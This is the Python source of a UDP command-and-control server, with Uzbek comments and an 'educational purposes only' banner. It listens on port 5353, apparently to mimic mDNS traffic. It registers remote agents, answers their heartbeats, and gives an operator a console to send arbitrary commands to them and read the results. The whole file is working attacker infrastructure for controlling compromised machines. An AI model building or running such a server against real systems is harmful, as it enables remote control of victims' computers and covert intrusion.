"""
UDP C2 Server - Connectionless Protocol
Tez va engil aloqa uchun
"""

import socket
import json
import threading
from datetime import datetime
import sys
import os

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from common.config import *
from common.crypto import *


class UDPC2Server:
    """UDP C2 Server"""
    
    def __init__(self, host='0.0.0.0', port=5353):
        self.host = host
        self.port = port
        self.running = False
        self.agents = {}
        self.socket = None
        
    def start(self):
        """Server ishga tushirish"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.socket.bind((self.host, self.port))
            self.running = True
            
            print(f"\n{'='*50}")
            print(f"🎯 UDP C2 Server")
            print(f"⚠️  Faqat ta'lim maqsadida!")
            print(f"{'='*50}")
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] 🚀 UDP Server: {self.host}:{self.port}")
            print(f"\n📊 UDP Server CLI")
            print(f"Komandalar: agents, send, status, help, quit")
            print(f"{'-'*50}\n")
            
            # Receive thread
            receive_thread = threading.Thread(target=self._receive_loop, daemon=True)
            receive_thread.start()
            
            # CLI loop
            self._cli_loop()
            
        except Exception as e:
            print(f"❌ UDP Server xatosi: {e}")
            
    def _receive_loop(self):
        """UDP paketlarni qabul qilish"""
        while self.running:
            try:
                data, addr = self.socket.recvfrom(4096)
                threading.Thread(
                    target=self._handle_packet,
                    args=(data, addr),
                    daemon=True
                ).start()
            except:
                if self.running:
                    continue
                    
    def _handle_packet(self, data, addr):
        """UDP paket qayta ishlash"""
        try:
            message = json.loads(data.decode('utf-8'))
            agent_id = message.get('agent_id', 'unknown')
            cmd_type = message.get('type', 'unknown')
            
            # Agent ro'yxatga olish
            if agent_id not in self.agents:
                self.agents[agent_id] = {
                    'address': addr,
                    'first_seen': datetime.now(),
                    'last_seen': datetime.now(),
                    'packets': 0
                }
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 📡 Yangi agent: {agent_id} ({addr[0]}:{addr[1]})")
            
            # Update agent info
            self.agents[agent_id]['last_seen'] = datetime.now()
            self.agents[agent_id]['packets'] += 1
            
            # Handle command
            if cmd_type == 'heartbeat':
                response = {'status': 'ok', 'commands': []}
                self.socket.sendto(json.dumps(response).encode(), addr)
            elif cmd_type == 'result':
                print(f"[{agent_id}] 📥 Natija: {message.get('data', '')}")
                
        except Exception as e:
            print(f"❌ Paket qayta ishlash xatosi: {e}")
            
    def _cli_loop(self):
        """CLI loop"""
        while self.running:
            try:
                cmd = input("UDP-C2> ").strip().lower()
                
                if cmd == 'agents':
                    self._show_agents()
                elif cmd.startswith('send '):
                    parts = cmd.split(' ', 2)
                    if len(parts) >= 3:
                        agent_id = parts[1]
                        command = parts[2]
                        self._send_command(agent_id, command)
                elif cmd == 'status':
                    print(f"🟢 UDP Server: {self.host}:{self.port}")
                    print(f"📊 Agents: {len(self.agents)}")
                elif cmd == 'help':
                    self._show_help()
                elif cmd == 'quit':
                    self.stop()
                    break
                    
            except KeyboardInterrupt:
                self.stop()
                break
            except Exception as e:
                print(f"❌ Xato: {e}")
                
    def _show_agents(self):
        """Agentlarni ko'rsatish"""
        if not self.agents:
            print("📭 Agentlar yo'q")
            return
            
        print(f"\n📊 Ulangan Agentlar ({len(self.agents)}):")
        print(f"{'-'*70}")
        print(f"{'ID':<15} {'IP:Port':<25} {'Packets':<10} {'Last Seen'}")
        print(f"{'-'*70}")
        
        for agent_id, info in self.agents.items():
            addr = info['address']
            packets = info['packets']
            last_seen = info['last_seen'].strftime('%H:%M:%S')
            print(f"{agent_id:<15} {addr[0]}:{addr[1]:<19} {packets:<10} {last_seen}")
        print()
        
    def _send_command(self, agent_id, command):
        """Agentga komanda yuborish"""
        if agent_id not in self.agents:
            print(f"❌ Agent topilmadi: {agent_id}")
            return
            
        addr = self.agents[agent_id]['address']
        message = {
            'type': 'command',
            'command': command,
            'timestamp': datetime.now().isoformat()
        }
        
        self.socket.sendto(json.dumps(message).encode(), addr)
        print(f"✅ Komanda yuborildi: {agent_id}")
        
    def _show_help(self):
        """Yordam ko'rsatish"""
        print("""
╔════════════════════════════════════════════════════════╗
║               UDP C2 Server - Komandalar               ║
╠════════════════════════════════════════════════════════╣
║  agents              - Ulangan agentlarni ko'rsatish   ║
║  send <id> <cmd>     - Agentga komanda yuborish        ║
║  status              - Server statusini ko'rsatish     ║
║  help                - Yordam                          ║
║  quit                - Chiqish                         ║
╚════════════════════════════════════════════════════════╝
        """)
        
    def stop(self):
        """Serverni to'xtatish"""
        print("\n🛑 UDP Server to'xtatilmoqda...")
        self.running = False
        if self.socket:
            self.socket.close()
        print("✅ UDP Server to'xtatildi")


if __name__ == "__main__":
    server = UDPC2Server(host='0.0.0.0', port=5353)
    server.start()
